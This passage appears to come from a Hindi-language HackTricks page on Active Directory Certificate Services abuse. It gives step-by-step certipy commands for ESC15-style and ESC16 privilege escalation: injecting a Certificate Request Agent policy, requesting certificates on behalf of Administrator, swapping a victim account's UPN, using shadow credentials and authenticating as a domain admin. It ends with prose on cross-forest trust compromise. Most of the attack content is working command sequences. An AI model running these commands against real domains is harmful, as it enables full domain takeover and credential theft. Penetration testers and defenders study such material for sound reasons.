**Step 1: V1 टेम्पलेट से एक सर्टिफिकेट का अनुरोध करें (जिसमें "Enrollee supplies subject" हो), "Certificate Request Agent" एप्लिकेशन पॉलिसी को इंजेक्ट करते हुए।** यह सर्टिफिकेट हमलावर (`attacker@corp.local`) के लिए एक एनरोलमेंट एजेंट बनने के लिए है। यहाँ हमलावर की अपनी पहचान के लिए कोई UPN निर्दिष्ट नहीं किया गया है, क्योंकि लक्ष्य एजेंट क्षमता है।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` को इंजेक्ट करता है।

**चरण 2: एक लक्षित विशेषाधिकार प्राप्त उपयोगकर्ता की ओर से एक प्रमाणपत्र अनुरोध करने के लिए "एजेंट" प्रमाणपत्र का उपयोग करें।** यह एक ESC3-जैसा चरण है, चरण 1 से प्रमाणपत्र का उपयोग करते हुए एजेंट प्रमाणपत्र के रूप में।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**चरण 3: "on-behalf-of" प्रमाणपत्र का उपयोग करके विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में प्रमाणीकरण करें।**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Explanation

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** उस परिदृश्य को संदर्भित करता है जहाँ, यदि AD CS की कॉन्फ़िगरेशन सभी प्रमाणपत्रों में **szOID_NTDS_CA_SECURITY_EXT** एक्सटेंशन को शामिल करने को लागू नहीं करती है, तो एक हमलावर इसका लाभ उठा सकता है:

1. **SID बाइंडिंग के बिना** एक प्रमाणपत्र का अनुरोध करना।

2. इस प्रमाणपत्र का उपयोग **किसी भी खाते के रूप में प्रमाणीकरण के लिए** करना, जैसे कि एक उच्च-विशेषाधिकार खाते (जैसे, एक डोमेन प्रशासक) का अनुकरण करना।

आप इस लेख को और अधिक विस्तृत सिद्धांत जानने के लिए देख सकते हैं: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

निम्नलिखित [इस लिंक](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) का संदर्भित है, अधिक विस्तृत उपयोग विधियों को देखने के लिए क्लिक करें।

यह पहचानने के लिए कि क्या Active Directory Certificate Services (AD CS) वातावरण **ESC16** के प्रति संवेदनशील है
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**चरण 1: पीड़ित खाते का प्रारंभिक UPN पढ़ें (वैकल्पिक - पुनर्स्थापन के लिए)।**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**चरण 2: पीड़ित खाते का UPN लक्षित प्रशासक के `sAMAccountName` पर अपडेट करें।**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**चरण 3: (यदि आवश्यक हो) "शिकार" खाते के लिए क्रेडेंशियल प्राप्त करें (जैसे, Shadow Credentials के माध्यम से)।**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**चरण 4: ESC16-खतरे में पड़े CA पर _किसी भी उपयुक्त क्लाइंट प्रमाणीकरण टेम्पलेट_ (जैसे, "उपयोगकर्ता") से "शिकार" उपयोगकर्ता के रूप में एक प्रमाणपत्र का अनुरोध करें।** क्योंकि CA ESC16 के प्रति संवेदनशील है, यह जारी किए गए प्रमाणपत्र से SID सुरक्षा विस्तार को स्वचालित रूप से छोड़ देगा, चाहे इस विस्तार के लिए टेम्पलेट की विशिष्ट सेटिंग्स कुछ भी हों। Kerberos क्रेडेंशियल कैश पर्यावरण चर सेट करें (शेल कमांड):
```bash
export KRB5CCNAME=victim.ccache
```
फिर प्रमाणपत्र का अनुरोध करें:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**चरण 5: "शिकार" खाते का UPN वापस करें।**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**चरण 6: लक्षित प्रशासक के रूप में प्रमाणीकरण करें।**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## प्रमाणपत्रों के साथ जंगलों का समझौता निष्क्रिय वॉयस में समझाया गया

### समझौता किए गए CAs द्वारा जंगलों के विश्वासों का टूटना

**क्रॉस-फॉरेस्ट नामांकन** के लिए कॉन्फ़िगरेशन को अपेक्षाकृत सरल बनाया गया है। **रूट CA प्रमाणपत्र** को संसाधन जंगल से **खाता जंगलों में प्रकाशित** किया जाता है, और संसाधन जंगल से **एंटरप्राइज CA** प्रमाणपत्रों को **प्रत्येक खाता जंगल में `NTAuthCertificates` और AIA कंटेनरों में जोड़ा जाता है**। स्पष्ट करने के लिए, यह व्यवस्था **संसाधन जंगल में CA को सभी अन्य जंगलों पर पूर्ण नियंत्रण** प्रदान करती है जिनका वह PKI प्रबंधित करता है। यदि इस CA को **हमलावरों द्वारा समझौता किया जाता है**, तो संसाधन और खाता जंगलों में सभी उपयोगकर्ताओं के लिए प्रमाणपत्रों को **उनके द्वारा जाली बनाया जा सकता है**, जिससे जंगल की सुरक्षा सीमा टूट जाती है।

### विदेशी प्रिंसिपलों को दिए गए नामांकन विशेषाधिकार

मल्टी-फॉरेस्ट वातावरण में, एंटरप्राइज CAs के संबंध में सावधानी बरतने की आवश्यकता है जो **प्रमाणपत्र टेम्पलेट्स प्रकाशित करते हैं** जो **प्रमाणित उपयोगकर्ताओं या विदेशी प्रिंसिपलों** (उपयोगकर्ता/समूह जो उस जंगल के बाहर हैं जिसमें एंटरप्राइज CA है) को **नामांकन और संपादन अधिकार** प्रदान करते हैं।\
एक विश्वास के पार प्रमाणीकरण के बाद, **प्रमाणित उपयोगकर्ताओं का SID** AD द्वारा उपयोगकर्ता के टोकन में जोड़ा जाता है। इसलिए, यदि एक डोमेन में एक एंटरप्राइज CA है जिसमें एक टेम्पलेट है जो **प्रमाणित उपयोगकर्ताओं को नामांकन अधिकार** प्रदान करता है, तो एक उपयोगकर्ता **एक अलग जंगल से टेम्पलेट में नामांकित** हो सकता है। इसी तरह, यदि **एक टेम्पलेट द्वारा एक विदेशी प्रिंसिपल को स्पष्ट रूप से नामांकन अधिकार दिए जाते हैं**, तो **एक क्रॉस-फॉरेस्ट एक्सेस-कंट्रोल संबंध इस प्रकार बनाया जाता है**, जिससे एक जंगल से प्रिंसिपल को **दूसरे जंगल के टेम्पलेट में नामांकित** करने की अनुमति मिलती है।

दोनों परिदृश्यों से एक जंगल से दूसरे जंगल में **हमले की सतह में वृद्धि** होती है। प्रमाणपत्र टेम्पलेट की सेटिंग्स को एक हमलावर द्वारा एक विदेशी डोमेन में अतिरिक्त विशेषाधिकार प्राप्त करने के लिए शोषण किया जा सकता है।


{{#include ../../../banners/hacktricks-training.md}}
